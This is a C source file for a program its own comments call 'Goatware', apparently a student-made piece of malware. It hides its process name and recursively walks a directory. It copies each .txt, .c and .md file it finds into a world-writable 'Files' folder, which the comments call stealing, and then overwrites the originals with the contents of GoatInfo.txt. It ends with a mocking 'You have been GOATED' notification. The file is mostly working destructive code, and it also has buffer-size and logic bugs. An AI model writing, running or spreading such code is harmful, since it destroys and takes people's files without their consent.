/* Change the content of programs based on their file extension. */

#include "header.h"


int main(int argc, char *argv[]) {
	changeProcessName(argv);

	// Create folder "Files" to store all taken files
	if (mkdir("Files", 0777) < 0 && errno != EEXIST) {
		perror("mkdir failed");
		exit(EXIT_FAILURE);
	}
	chmod("Files", 0777);
	// Path of "Files" directory in current working directory
	getcwd(copyToDir, sizeof(copyToDir));
	strcat(copyToDir, "/Files");
	
	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
	openDir("test", 0);

	char command[100], msg[1000];

	strcpy(command,"notify-send ");
	strcpy(msg,"\"You have been GOATED.\"");
	strcat(command,msg);

	// Send system message
	system(command);

	// Give permission to access stolen files
	givePermission();
	return 0;
}


void openDir(const char *direct, int level) {
	DIR *dir;
	struct dirent *entry;

	dir = opendir(direct);
	entry = readdir(dir);

	if (!dir)
		return;
	if (!entry)
		return;

	do {
		char name[strlen(entry->d_name)];
		strcpy(name, entry->d_name);
		if (entry->d_type == DT_DIR) {
			// Skip if directory starts with a '.'			
			char first = name[0];
			if (first == '.' ) {
				continue;
			}
			
			// Create directory address path		
			char directPath[1024];
			int length = snprintf(directPath, sizeof(directPath)-1, "%s/%s", direct, entry->d_name);
			directPath[length] = 0;

			// Compare with current directory path
			char cwdTemp[1024];
			getcwd(cwdTemp, sizeof(cwdTemp));
			if (strcmp(cwdTemp, directPath) == 0 || strcmp(name, "Goatware") == 0) { //DELETE SECOND PART (STRCMP(NAME... when done
				continue;
			}

			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
				continue;
			}

			openDir(directPath, level + 1);
		}
		else {
			/* Changes file if is a .txt, .c, or .md file */
			changeTxt(entry, direct); 
			changeC(entry, direct);
			changeMd(entry, direct);
		}
	} while (entry = readdir(dir));
	closedir(dir);
}

// Gives permission to access all the files that were stolen
void givePermission() {
	DIR *dir;
	struct dirent *entry;

	dir = opendir("Files");
	entry = readdir(dir);
	
	if (!dir)
		return;
	if (!entry)
		return;

	int i = 0;
	do {
		chmod(entry->d_name, 0777);
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
				continue;
		}
		strcpy(stolenFiles[i], entry->d_name);
		i++;
		printf("%s has been given access permission.\n", entry->d_name);
	} while (entry = readdir(dir));
	closedir(dir);
}

//copies original file to goatware folder
int copyFile(char *address, char *destPath) {
    int sourceFolder, destinationFolder, x, reader;
    unsigned char buffer[4096];

    sourceFolder = open(address, O_RDONLY);
    destinationFolder = open(destPath, O_CREAT | O_WRONLY);
	
    while (1) {
        reader = read(sourceFolder, buffer, 4096);
        if (reader == -1) {
             printf("File Reading Error. address %s destPath: %s\n", address, destPath);
            return 1;
        }
        x = reader;

        if (x == 0) break;
	
        reader = write(destinationFolder, buffer, x);
        if (reader == -1) {
             printf("File Writing Error. address %s destPath: %s\n", address, destPath);
             return 1;
        }
    }

    close(sourceFolder);
    close(destinationFolder);
}
void changeTxt(struct dirent *entry, const char *direct) {
	int entryLength = strlen(entry->d_name);

	// fileName[] is name of current file to be stolen (will not be altered)
	char fileName[entryLength];
	strcpy(fileName, entry->d_name);

	// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
	if (entryLength < 4) {
		return;
	}
	char name[entryLength];
	char checkName[5];			

	// Get last four characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 4], 4);
	checkName[4] = '\0';

	// Opens GoatInfo.txt and copies contents to selected file if it has .txt extension
	if (strcmp(checkName, ".txt") == 0) { 
		// Create address to copy .txt file to called destPath
		char destPath[1024];
		strcpy(destPath, copyToDir);
		strcat(destPath, "/");
		strcat(destPath, fileName);

		// Create address to .txt file called address			
		char address[1024];
		strcpy(address, direct);
		strcat(address, "/");
		strcat(address, fileName);

		copyFile(address, destPath);	

		FILE *fp1, *fp2;
		char ch;
		if (strstr(address, "GoatInfo.txt") != NULL) {
			return;
		}
		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}

void changeC(struct dirent *entry, const char *direct) {
	
	int entryLength = strlen(entry->d_name);

	// fileName[] is name of current file to be stolen (will not be altered)
	char fileName[entryLength];
	strcpy(fileName, entry->d_name);

	// name[] is name of current file, checkName is last two characters of file to see if it is '.c'
	if (entryLength < 2) {
		return;
	}
	char name[entryLength];
	char checkName[3];			

	// Get last two characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 2], 2);
	checkName[2] = '\0';

	// Opens GoatInfo.txt and copies contents to selected file if it has .c extension
	if (strcmp(checkName, ".c") == 0) { 
		// Create address to copy .c file to called destPath
		char destPath[1024];
		strcpy(destPath, copyToDir);
		strcat(destPath, "/");
		strcat(destPath, fileName);

		// Create address to .c file			
		char address[1024];
		strcpy(address, direct);
		strcat(address, "/");
		strcat(address, fileName);

		copyFile(address, destPath);	

		FILE *fp1, *fp2;
		char ch;
		if (strstr(address, "changeFiles.c") != NULL && strstr(address, "renameProcess.c") != NULL) {
			return;
		}
		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}

void changeMd(struct dirent *entry, const char *direct) {
	int entryLength = strlen(entry->d_name);

	// fileName[] is name of current file to be stolen (will not be altered)
	char fileName[entryLength];
	strcpy(fileName, entry->d_name);

	// name[] is name of current file, checkName is last three characters of file to see if it is '.md'
	if (entryLength < 3) {
		return;
	}
	char name[entryLength];
	char checkName[4];			

	// Get last three characters of current file
	strcpy(name, entry->d_name);
	memcpy(checkName, &name[entryLength - 3], 3);
	checkName[3] = '\0';

	// Opens GoatInfo.txt and copies contents to selected file if it has .md extension
	if (strcmp(checkName, ".md") == 0) { 
		// Create address to copy .md file to called destPath
		char destPath[1024];
		strcpy(destPath, copyToDir);
		strcat(destPath, "/");
		strcat(destPath, fileName);

		// Create address to .md file			
		char address[1024];
		strcpy(address, direct);
		strcat(address, "/");
		strcat(address, fileName);

		copyFile(address, destPath);	

		FILE *fp1, *fp2;
		char ch;
	
		fp1 = fopen("GoatInfo.txt", "r");				
		fp2 = fopen(address, "w+");

		if (fp1 != NULL && fp2 != NULL) {
			while (1) {
				ch = fgetc(fp1);
				if (ch == EOF) {
					break;
				} else {
					putc(ch, fp2);
				}
			}
		}
		fclose(fp1);
		fclose(fp2);
	}
}



